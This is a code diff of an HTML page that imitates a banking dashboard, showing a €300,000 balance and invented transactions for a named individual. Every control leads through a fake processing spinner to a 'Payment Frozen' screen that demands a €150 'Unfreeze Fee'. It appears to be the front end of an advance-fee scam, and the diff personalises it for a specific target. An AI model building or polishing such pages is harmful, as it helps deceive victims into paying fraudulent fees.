@@ -5,168 +5,154 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Dashboard</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: hsl(220 20% 97%); color: hsl(220 20% 10%); }
-  .hidden { display: none; }
-  .screen { min-height: 100vh; }
-  .center { display: flex; align-items: center; justify-content: center; flex-direction: column; gap: 16px; }
-  .spinner { width: 48px; height: 48px; border: 4px solid hsl(262 83% 58% / 0.2); border-top-color: hsl(262 83% 58%); border-radius: 50%; animation: spin 1s linear infinite; }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .muted { color: hsl(220 10% 46%); font-size: 18px; }
-  .card { background: #fff; border-radius: 12px; border: 1px solid hsl(220 13% 91%); box-shadow: 0 1px 3px rgba(0,0,0,0.06); }
-  .frozen-card { max-width: 420px; width: 100%; padding: 32px; text-align: center; }
-  .frozen-card > * + * { margin-top: 20px; }
-  .icon-circle { width: 64px; height: 64px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto; }
-  .icon-circle.red { background: hsl(0 84% 60% / 0.1); color: hsl(0 84% 60%); }
-  h1 { font-size: 24px; font-weight: 700; }
-  .fee-box { background: hsl(220 14% 96%); border-radius: 12px; padding: 16px; }
-  .fee-box .label { font-size: 14px; color: hsl(220 10% 46%); }
-  .fee-box .amount { font-size: 30px; font-weight: 700; margin-top: 4px; }
-  .notice { background: hsl(262 83% 58% / 0.05); border: 1px solid hsl(262 83% 58% / 0.2); border-radius: 12px; padding: 16px; display: flex; gap: 12px; text-align: left; align-items: flex-start; }
-  .notice svg { flex-shrink: 0; color: hsl(262 83% 58%); margin-top: 2px; }
-  .notice p { font-size: 14px; }
-  .btn-primary { width: 100%; height: 48px; background: hsl(262 83% 58%); color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
-  .btn-primary:hover { opacity: 0.9; }
-  .btn-text { background: none; border: none; font-size: 14px; color: hsl(220 10% 46%); cursor: pointer; }
-  .btn-text:hover { color: hsl(220 20% 10%); }
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f7;color:#1a1a2e;min-height:100vh}
+.hidden{display:none!important}
+.screen{min-height:100vh}
 
-  /* Dashboard */
-  .header { padding: 24px 20px 8px; display: flex; align-items: center; justify-content: space-between; }
-  .user-info { display: flex; align-items: center; gap: 12px; }
-  .avatar { width: 40px; height: 40px; border-radius: 50%; background: hsl(262 83% 58%); color: #fff; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 18px; }
-  .user-info .sub { font-size: 14px; color: hsl(220 10% 46%); }
-  .user-info .name { font-weight: 600; }
-  .header-actions { display: flex; gap: 8px; }
-  .icon-btn { width: 40px; height: 40px; border-radius: 50%; background: #fff; border: 1px solid hsl(220 13% 91%); display: flex; align-items: center; justify-content: center; cursor: pointer; color: hsl(220 10% 46%); }
+/* Loading */
+.loading-screen{display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px}
+.spinner{width:48px;height:48px;border:4px solid #e0d4f7;border-top-color:#7c3aed;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-text{color:#6b7280;font-size:18px}
 
-  .balance-card { margin: 16px 20px 0; background: hsl(262 83% 58%); color: #fff; padding: 24px; border-radius: 16px; border: none; box-shadow: 0 10px 30px -10px hsl(262 83% 58% / 0.4); }
-  .balance-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; }
-  .balance-header span { font-size: 14px; opacity: 0.8; }
-  .balance-header button { background: none; border: none; color: #fff; opacity: 0.8; cursor: pointer; }
-  .balance-amount { font-size: 36px; font-weight: 700; letter-spacing: -1px; margin-bottom: 24px; }
-  .action-buttons { display: flex; gap: 12px; }
-  .action-btn { flex: 1; display: flex; flex-direction: column; align-items: center; gap: 6px; background: none; border: none; color: #fff; cursor: pointer; }
-  .action-btn .circle { width: 48px; height: 48px; border-radius: 50%; background: rgba(255,255,255,0.2); display: flex; align-items: center; justify-content: center; }
-  .action-btn .circle:hover { background: rgba(255,255,255,0.3); }
-  .action-btn span { font-size: 12px; opacity: 0.9; }
+/* Frozen */
+.frozen-screen{display:flex;align-items:center;justify-content:center;padding:16px}
+.frozen-card{background:#fff;border-radius:16px;padding:32px;max-width:400px;width:100%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,0.08)}
+.frozen-icon{width:64px;height:64px;border-radius:50%;background:#fef2f2;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:32px}
+.frozen-title{font-size:24px;font-weight:700;margin-bottom:8px}
+.frozen-desc{color:#6b7280;margin-bottom:20px}
+.fee-box{background:#f5f3ff;border-radius:12px;padding:16px;margin-bottom:16px}
+.fee-label{font-size:14px;color:#6b7280}
+.fee-amount{font-size:30px;font-weight:700}
+.notice{background:#f5f3ff;border:1px solid #ddd6fe;border-radius:12px;padding:16px;text-align:left;display:flex;gap:12px;margin-bottom:20px;font-size:14px}
+.notice-icon{color:#7c3aed;font-size:18px;flex-shrink:0}
+.pay-btn{width:100%;padding:14px;background:#7c3aed;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer}
+.pay-btn:hover{background:#6d28d9}
+.back-link{display:inline-block;margin-top:16px;color:#6b7280;font-size:14px;cursor:pointer;border:none;background:none}
+.back-link:hover{color:#1a1a2e}
 
-  .section { padding: 24px 20px 0; }
-  .section:last-child { padding-bottom: 32px; }
-  .section h2 { font-size: 18px; font-weight: 600; margin-bottom: 12px; }
-  .quick-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-  .quick-item { display: flex; flex-direction: column; align-items: center; gap: 8px; padding: 16px; background: #fff; border-radius: 12px; border: 1px solid hsl(220 13% 91%); cursor: pointer; }
-  .quick-item:hover { border-color: hsl(262 83% 58% / 0.3); }
-  .quick-item svg { color: hsl(262 83% 58%); }
-  .quick-item span { font-size: 14px; font-weight: 500; }
+/* Dashboard */
+.header{padding:24px 20px 8px;display:flex;justify-content:space-between;align-items:center}
+.user-info{display:flex;align-items:center;gap:12px}
+.avatar{width:40px;height:40px;border-radius:50%;background:#7c3aed;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:18px}
+.welcome{font-size:14px;color:#6b7280}
+.username{font-weight:600}
+.header-icons{display:flex;gap:8px}
+.icon-btn{width:40px;height:40px;border-radius:50%;background:#fff;border:1px solid #e5e7eb;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:18px;color:#6b7280}
 
-  .tx-list { background: #fff; border-radius: 12px; border: 1px solid hsl(220 13% 91%); overflow: hidden; }
-  .tx-row { display: flex; justify-content: space-between; align-items: center; padding: 16px; cursor: pointer; border: none; background: none; width: 100%; text-align: left; }
-  .tx-row:hover { background: hsl(220 14% 96% / 0.5); }
-  .tx-row + .tx-row { border-top: 1px solid hsl(220 13% 91%); }
-  .tx-name { font-weight: 500; }
-  .tx-date { font-size: 14px; color: hsl(220 10% 46%); }
-  .tx-amount { font-weight: 600; }
-  .tx-amount.positive { color: hsl(142 71% 45%); }
+.balance-card{margin:16px 20px;background:linear-gradient(135deg,#7c3aed,#9333ea);color:#fff;border-radius:16px;padding:24px;box-shadow:0 8px 32px rgba(124,58,237,0.3)}
+.bal-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:4px}
+.bal-label{font-size:14px;opacity:.8}
+.eye-btn{background:none;border:none;color:#fff;opacity:.8;cursor:pointer;font-size:18px}
+.bal-amount{font-size:36px;font-weight:700;margin-bottom:24px}
+.actions{display:flex;gap:12px}
+.action-btn{flex:1;display:flex;flex-direction:column;align-items:center;gap:6px;background:none;border:none;color:#fff;cursor:pointer}
+.action-circle{width:48px;height:48px;border-radius:50%;background:rgba(255,255,255,0.2);display:flex;align-items:center;justify-content:center;font-size:20px}
+.action-circle:hover{background:rgba(255,255,255,0.3)}
+.action-label{font-size:12px;opacity:.9}
+
+.section{padding:24px 20px 0}
+.section-title{font-size:18px;font-weight:600;margin-bottom:12px}
+.quick-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.quick-btn{display:flex;flex-direction:column;align-items:center;gap:8px;padding:16px;background:#fff;border-radius:12px;border:1px solid #e5e7eb;cursor:pointer;font-size:14px;font-weight:500}
+.quick-btn:hover{border-color:#c4b5fd}
+.quick-icon{font-size:24px;color:#7c3aed}
+
+.tx-list{background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,0.04);margin-bottom:32px}
+.tx-row{display:flex;justify-content:space-between;align-items:center;padding:16px;cursor:pointer;border-bottom:1px solid #f3f4f6}
+.tx-row:last-child{border-bottom:none}
+.tx-row:hover{background:#faf5ff}
+.tx-name{font-weight:500}
+.tx-date{font-size:14px;color:#6b7280}
+.tx-amount{font-weight:600}
+.tx-positive{color:#22c55e}
 </style>
 </head>
 <body>
-
-<!-- Loading Screen -->
-<div id="loading" class="screen center hidden">
-  <div class="spinner"></div>
-  <p class="muted">Processing your request...</p>
-</div>
-
-<!-- Frozen Screen -->
-<div id="frozen" class="screen center hidden" style="padding:16px">
-  <div class="card frozen-card">
-    <div class="icon-circle red">
-      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
-    </div>
-    <h1>Payment Frozen</h1>
-    <p class="muted" style="font-size:16px">Your payment has been temporarily frozen for security verification.</p>
-    <div class="fee-box">
-      <p class="label">Unfreeze Fee</p>
-      <p class="amount">€150.00</p>
-    </div>
-    <div class="notice">
-      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
-      <p>Once the payment is unfrozen, the full balance will be available on your receiving account within 1–2 business days.</p>
-    </div>
-    <button class="btn-primary" onclick="showLoading()">Pay €150 to Unfreeze</button>
-    <button class="btn-text" onclick="showDashboard()">Back to Dashboard</button>
-  </div>
-</div>
 
 <!-- Dashboard -->
 <div id="dashboard" class="screen">
   <div class="header">
     <div class="user-info">
-      <div class="avatar">U</div>
-      <div><p class="sub">Welcome back</p><p class="name">User</p></div>
+      <div class="avatar">F.S</div>
+      <div><div class="welcome">Welcome back</div><div class="username">Finnur Sturluson</div></div>
     </div>
-    <div class="header-actions">
-      <button class="icon-btn"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"/><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"/></svg></button>
-      <button class="icon-btn"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/></svg></button>
+    <div class="header-icons">
+      <button class="icon-btn" onclick="handleAction()">🔔</button>
+      <button class="icon-btn" onclick="handleAction()">⚙️</button>
     </div>
   </div>
-
   <div class="balance-card">
-    <div class="balance-header">
-      <span>Total Balance</span>
-      <button onclick="toggleBalance()" id="eyeBtn"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg></button>
+    <div class="bal-top">
+      <span class="bal-label">Total Balance</span>
+      <button class="eye-btn" onclick="toggleBalance()">👁️</button>
     </div>
-    <p class="balance-amount" id="balanceText">€300,000.00</p>
-    <div class="action-buttons">
-      <button class="action-btn" onclick="handleAction()"><div class="circle"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m7 7 10 10"/><path d="M17 7v10H7"/></svg></div><span>Send</span></button>
-      <button class="action-btn" onclick="handleAction()"><div class="circle"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m17 17-10-10"/><path d="M7 17V7h10"/></svg></div><span>Receive</span></button>
-      <button class="action-btn" onclick="handleAction()"><div class="circle"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg></div><span>Pay</span></button>
-      <button class="action-btn" onclick="handleAction()"><div class="circle"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="1"/><circle cx="19" cy="12" r="1"/><circle cx="5" cy="12" r="1"/></svg></div><span>More</span></button>
+    <div class="bal-amount" id="balanceText">€300,000.00</div>
+    <div class="actions">
+      <button class="action-btn" onclick="handleAction()"><div class="action-circle">↗️</div><span class="action-label">Send</span></button>
+      <button class="action-btn" onclick="handleAction()"><div class="action-circle">↙️</div><span class="action-label">Receive</span></button>
+      <button class="action-btn" onclick="handleAction()"><div class="action-circle">💳</div><span class="action-label">Pay</span></button>
+      <button class="action-btn" onclick="handleAction()"><div class="action-circle">⋯</div><span class="action-label">More</span></button>
     </div>
   </div>
-
   <div class="section">
-    <h2>Quick Actions</h2>
+    <div class="section-title">Quick Actions</div>
     <div class="quick-grid">
-      <div class="quick-item" onclick="handleAction()"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/></svg><span>History</span></div>
-      <div class="quick-item" onclick="handleAction()"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2.5"/><path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"/></svg><span>Accounts</span></div>
-      <div class="quick-item" onclick="handleAction()"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/></svg><span>Cards</span></div>
+      <button class="quick-btn" onclick="handleAction()"><span class="quick-icon">🕐</span>History</button>
+      <button class="quick-btn" onclick="handleAction()"><span class="quick-icon">👛</span>Accounts</button>
+      <button class="quick-btn" onclick="handleAction()"><span class="quick-icon">💳</span>Cards</button>
     </div>
   </div>
-
   <div class="section" style="padding-bottom:32px">
-    <h2>Recent Transactions</h2>
+    <div class="section-title">Recent Transactions</div>
     <div class="tx-list">
-      <button class="tx-row" onclick="handleAction()"><div><p class="tx-name">Netflix</p><p class="tx-date">Today</p></div><p class="tx-amount">-€15.99</p></button>
-      <button class="tx-row" onclick="handleAction()"><div><p class="tx-name">Salary Deposit</p><p class="tx-date">Yesterday</p></div><p class="tx-amount positive">+€12,500.00</p></button>
-      <button class="tx-row" onclick="handleAction()"><div><p class="tx-name">Amazon</p><p class="tx-date">Mar 28</p></div><p class="tx-amount">-€89.00</p></button>
-      <button class="tx-row" onclick="handleAction()"><div><p class="tx-name">Transfer In</p><p class="tx-date">Mar 27</p></div><p class="tx-amount positive">+€5,000.00</p></button>
+      <div class="tx-row" onclick="handleAction()"><div><div class="tx-name">Netflix</div><div class="tx-date">Today</div></div><div class="tx-amount">-€15.99</div></div>
+      <div class="tx-row" onclick="handleAction()"><div><div class="tx-name">Salary Deposit</div><div class="tx-date">Yesterday</div></div><div class="tx-amount tx-positive">+€12,500.00</div></div>
+      <div class="tx-row" onclick="handleAction()"><div><div class="tx-name">Amazon</div><div class="tx-date">Mar 28</div></div><div class="tx-amount">-€89.00</div></div>
+      <div class="tx-row" onclick="handleAction()"><div><div class="tx-name">Transfer In</div><div class="tx-date">Mar 27</div></div><div class="tx-amount tx-positive">+€5,000.00</div></div>
     </div>
   </div>
 </div>
 
+<!-- Loading -->
+<div id="loading" class="screen loading-screen hidden">
+  <div class="spinner"></div>
+  <div class="loading-text">Processing your request...</div>
+</div>
+
+<!-- Frozen -->
+<div id="frozen" class="screen frozen-screen hidden">
+  <div class="frozen-card">
+    <div class="frozen-icon">⚠️</div>
+    <div class="frozen-title">Payment Frozen</div>
+    <div class="frozen-desc">Your payment has been temporarily frozen for security verification.</div>
+    <div class="fee-box"><div class="fee-label">Unfreeze Fee</div><div class="fee-amount">€150.00</div></div>
+    <div class="notice"><span class="notice-icon">ℹ️</span><span>Once the payment is unfrozen, the full balance will be available on your receiving account within 1–2 business days.</span></div>
+    <button class="pay-btn" onclick="handleAction()">Pay €150 to Unfreeze</button>
+    <button class="back-link" onclick="show('dashboard')">Back to Dashboard</button>
+  </div>
+</div>
+
 <script>
-  let balanceVisible = true;
+let balanceVisible = true;
 
-  function show(id) {
-    document.getElementById('dashboard').classList.add('hidden');
-    document.getElementById('loading').classList.add('hidden');
-    document.getElementById('frozen').classList.add('hidden');
-    document.getElementById(id).classList.remove('hidden');
-  }
+function show(id) {
+  document.getElementById('dashboard').classList.add('hidden');
+  document.getElementById('loading').classList.add('hidden');
+  document.getElementById('frozen').classList.add('hidden');
+  document.getElementById(id).classList.remove('hidden');
+}
 
-  function showDashboard() { show('dashboard'); }
-  function showLoading() { show('loading'); setTimeout(() => show('frozen'), 3000); }
+function handleAction() {
+  show('loading');
+  setTimeout(() => show('frozen'), 3000);
+}
 
-  function handleAction() {
-    show('loading');
-    setTimeout(() => show('frozen'), 3000);
-  }
-
-  function toggleBalance() {
-    balanceVisible = !balanceVisible;
-    document.getElementById('balanceText').textContent = balanceVisible ? '€300,000.00' : '••••••••';
-  }
+function toggleBalance() {
+  balanceVisible = !balanceVisible;
+  document.getElementById('balanceText').textContent = balanceVisible ? '€300,000.00' : '••••••••';
+}
 </script>
 </body>
 </html>
